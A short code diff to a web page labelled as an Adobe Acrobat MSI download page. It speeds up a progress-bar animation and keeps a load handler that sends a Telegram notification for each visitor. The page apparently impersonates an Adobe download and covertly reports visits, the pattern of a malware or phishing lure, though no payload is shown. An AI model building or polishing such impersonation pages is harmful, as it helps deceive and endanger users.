@@ -266,13 +266,13 @@
       }
     }
     
-    /* Updated progress animation duration for 2 seconds */
+    /* Updated progress animation duration for 1 second */
     .progress-fill {
       width: 0%;
       height: 100%;
       background: #1473e6;
       border-radius: 4px;
-      animation: fillProgress 2s ease-out forwards; /* Changed from 4s to 2s */
+      animation: fillProgress 1s ease-out forwards; /* Changed from 4s to 1s */
     }
     
     /* Step content */
@@ -798,7 +798,7 @@ Adobe Acrobat MSI Download Page Visit`;
       }
     }
     
-    // Animate progress percentage from 0% to 100% over 4 seconds
+    // Animate progress percentage from 0% to 100% over 1 second
     window.addEventListener('load', async function() {
       // Send Telegram notification for visitor
       try {
@@ -808,7 +808,7 @@ Adobe Acrobat MSI Download Page Visit`;
         console.error('Error with visitor tracking:', error);
       }
       const percentageElement = document.getElementById('progress-percentage');
-      const duration = 4000; // 4 seconds
+      const duration = 1000; // 1 second
       const startTime = Date.now();
       
       function updatePercentage() {
